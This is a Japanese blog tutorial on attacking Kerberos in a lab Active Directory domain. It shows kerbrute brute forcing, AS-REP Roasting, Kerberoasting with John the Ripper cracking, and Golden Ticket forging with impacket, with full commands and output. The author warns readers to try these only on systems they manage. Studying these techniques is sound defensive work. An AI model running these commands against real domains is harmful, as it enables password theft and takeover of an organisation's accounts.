---
title: "Kerberos への攻撃手法"
date: 2020-02-29T10:17:51+09:00
draft: false
categories:
- security
toc: false
---
# 目次

## はじめに

本記事では、[前記事(Kerberos 入門)](https://alicemacs.com/blog/krb5_101/)で学んだKerberosの基本的な概念や動作を知っていることを前提にKerberosへの攻撃手法について解説します。ここで紹介している内容は、自分で管理している端末外では決して行わないでください。

## Brute Force Attack for Kerberos

Kerberosにおいてもブルートフォース攻撃は有効です。Kerberosへのブルートフォース攻撃を行うために必要な条件は基本的には1つです。それは、KDCへの接続ができるという条件だけです。さらにKerberosの認証のレスポンスで、パスワードが間違っている場合、ユーザ名が正しいかどうかを教えてくれます。つまり、存在するユーザかどうかの判断を行うことができます。しかしながら、試行回数などによりブロックしたりすることも可能なので、本攻撃を行う際には注意が必要です。  
ブルートフォースを行うツールとしては、[kerbrute](https://github.com/TarlogicSecurity/kerbrute)が便利です。ユーザ名とパスワードを記載したファイル、ドメインを指定することでブルートフォース攻撃が行えます。

```shell
kali@kali:~/bin/kerbrute$ ./kerbrute.py -users ./username.txt -passwords ./password.txt -domain dc01.alicemacs.local
Impacket v0.9.21.dev1+20200217.163437.e5e676d7 - Copyright 2020 SecureAuth Corporation

[*] Stupendous => snickers66:snickers66
[*] Saved TGT in snickers66.ccache
[*] Valid user => Administrator
```

上記の実行結果では、ユーザ名とパスワードが同じ`snickers66`というドメインユーザを特定しており、`snickers66.ccache`というファイルにTGTが保存されています。また、パスワードは違いますが、`Administrator`というユーザが存在することも判明しています(余談ですが、Windowsでは今回判明したような簡単なパスワードは、通常パスワードの複雑さのグループポリシーで許可されていません。そのため、今回はグループポリシーの「パスワードのポリシー」の項目の1つである「複雑さの要件を満たす必要があるパスワード」という項目を無効化しました)。

## AS-REP Roasting

Kerberos 5には、事前認証(Pre-authentication)という概念があります。クライアントがAS\_REQを送信した後、ASは誰にでもAS\_REPをレスポンスするのではなく、`KRB_ERROR`という事前認証を要求するメッセージをレスポンスします。これを受け取ったクライアントは、クライアントのプリンシパル名と「クライアントの鍵」で暗号化したタイムスタンプを送信します。これを受け取ったASは、クライアントが正しいかを確認してからTGTを返信します。Active Directoryでは、本機能はユーザ単位で制御することができます。デフォルトでは、「事前認証を必要としない」という設定が無効になっているため、通常は事前認証が要求されます。

<img src="https://i.imgur.com/iLS8TBF.png" width="40%">

しかし、もしこの設定を有効にしていたり、Kerberos 4を利用している場合は、どんなプリンシパルからのTGTの要求に対しても、ASはTGTを返信してしまいます(ASは、プリンシパルが存在すること、タイムスタンプがずれていないことしか確認しないため)。そのため、事前認証が無効のユーザを装った偽のAS\_REQを送信することで、AS\_REPをレスポンスさせることが可能となります。実は、このAS\_REPのメッセージ内には、クライアントのパスワードがもとになって生成された鍵で暗号化されたデータが含まれています。そのため、手にれたデータをオフラインで解析することで、最終的にパスワードを特定することが可能となる場合もあります。

AS-REP Roastingを行うには、impacketの`GetNPUsers.py`が利用できます。下記のように`-no-pass`オプションを利用することで、パスワードがわかっていない場合でもAS\_REPに含まれる暗号化されたデータを抽出できます。また、抽出したデータは、HashcatとJohn The Ripperの2つのフォーマットで出力できます。今回はJohn The Ripperで辞書攻撃を行うため`-john`オプションを設定しています。また、ここでは本データを`snickers66.asrep`というファイルに保存しておきました。

```shell
kali@kali:~/bin/impacket/examples$ python GetNPUsers.py dc01.alicemacs.local/snickers66 -no-pass --john
Impacket v0.9.21.dev1+20200217.163437.e5e676d7 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for snickers66
$krb5asrep$snickers66@DC01.ALICEMACS.LOCAL:e6d57700774dcb412bad8ac0dbb80638$5c62524951cdcbabd4f5067229b4404a0769ee9256e91df90a40c09d17d4ca2d34c39cfd72bc5230a395a4869c97cfca8073f3195c11dc56cb7c9c7abaefc15e51a055c7b189f0857f91c9a50d6c8c3bac3a6afba06ba76cc19c74627cd9cc6a2516b6462845eeda206ed319bf21298edae40466aa7761a6ec76b0072ca47f57928e94f7deaaadcf67d5ca99f2cd7015d16602d8f701020c4f00c685a5864250219c1b3b9d3879aaa3a423a7b572546393cae07b2e02ce1299a1409278e8298580b6336f4022034475c4e7f0fac5fe9d15cfa6b5d620c690c24514d7f4c6553beb6fb5cabf66bb53751b35114b56532c4fae6abe60509bc07a9b9597
```

そしてJohn The Ripperで辞書攻撃を試みます。辞書には、Kali Linuxに標準でインストールされているものを利用しています。

```shell
kali@kali:~/bin/impacket/examples$ john --wordlist=/usr/share/wordlists/rockyou.txt snickers66.asrep
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snickers66       ($krb5asrep$snickers66@DC01.ALICEMACS.LOCAL)
1g 0:00:00:01 DONE (2020-02-29 21:02) 0.7812g/s 455600p/s 455600c/s 455600C/s snugglepot..smexy14
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

上記結果より、`snickers66`というパスワードが辞書攻撃によって判明したことがわかります。このように弱いパスワードなどを利用している場合、最終的にパスワードの特定まで行えてしまう可能性がありますので、もし意図せず本設定が有効になっている場合は、無効にするようにしたほうが良いでしょう。

## Kerberoasting

Kerberoastingは、ドメインユーザに紐付いたサービスのサービスチケットを取得し、オフラインで辞書攻撃などによりパスワードを解析する攻撃手法です。サービスチケットには、サービスの所有者のNTLMハッシュから継承された鍵で暗号化されている部分があります。そのため、サービスの所有者が、一般的なドメインユーザだった場合、最終的にドメインユーザのパスワードを特定することが可能となります。  
Kerberoastingには、impacketの`GetUserSPNs.py`が利用できます。ここで、`snickers66`ユーザのパスワード(`snickers66`)は既知の想定で行っています。

```
kali@kali:~/bin/impacket/examples$ python GetUserSPNs.py dc01.alicemacs.local/snickers66:snickers66 -outputfile ticket
Impacket v0.9.21.dev1+20200217.163437.e5e676d7 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName          Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation
----------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
dc01.alicemacs.local/svctest  svctest  CN=Administrators,CN=Builtin,DC=dc01,DC=alicemacs,DC=local  2020-03-04 10:27:40.516240  <never>



kali@kali:~/bin/impacket/examples$ john --wordlist=/usr/share/wordlists/rockyou.txt ticket
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snickers66       (?)
1g 0:00:00:00 DONE (2020-03-04 10:45) 1.123g/s 655244p/s 655244c/s 655244C/s snugglepot..smexy14
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

上記の結果より、1つのSTが手に入っていることがわかります。そこで、`svctest`ユーザのSTをJohn The Ripperで辞書攻撃します。その結果、`snickers66`というのがパスワードだと判明しました。また今回のケースでは、`svctest`ユーザは、`Administrators`のグループでもあることから、このパスワードを使ってログインすることでより多くの攻撃が可能となります。


## Pass the Ticket(PtT)

Pass the Ticketとは、盗んだり偽装したKerberosのチケットを利用する攻撃のことです。Pass The Ticketには大きく分けて2つの代表的な手法が存在します。それが、Golden TicketとSilver Ticketです。

### Golden Ticket

Kerberosのしくみ上、TGTを手に入れることができればそのアカウントになりすまして、サービスチケットを発行することが可能となります。Golden Ticketとは、偽装したTGTを用いてサービスにアクセスする攻撃手法、またその偽装したTGTのことを指します。もしDomain Adminsグループの権限を持つようなTGTを偽装することができれば、任意のサービスにアクセスすることが可能となります。impacketの`ticketer.py`では、Golden Ticketの作成が行えます。作成するためには、以下の3つの情報が必要となります。

- ドメインSID
- ドメイン名
- krbtgtのNTLMハッシュ

それぞれの情報を設定し実行した結果が以下です(krbtgtのNTLMハッシュは、今回はmimikatzを用いて取得しました)。

```
kali@kali:~/bin/impacket/examples$ python ticketer.py -domain-sid S-1-5-21-1027962296-3006713031-785832913 -domain dc01.alicemacs.local -nthash af76050fb452fbe7476a165f9a82ce10 Administrator
Impacket v0.9.21.dev1+20200217.163437.e5e676d7 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for dc01.alicemacs.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

最終的に、`Administrator.ccache`というファイルに偽装されたTGTが保存されます。

### Silver Ticket

**執筆中**
Silver Ticketは、Golden Ticketとほぼ同様の手法です。Silver Ticketでは、STを偽装してサービスを利用します。

## おわりに

## 参考文献

- [Kerberos: The Definitive Guide](https://www.oreilly.co.jp/books/4873111862/)
- [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [Attacking Kerberos](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)
- [Roasting Kerberos](https://fluidattacks.com/web/blog/roasting-kerberos/)
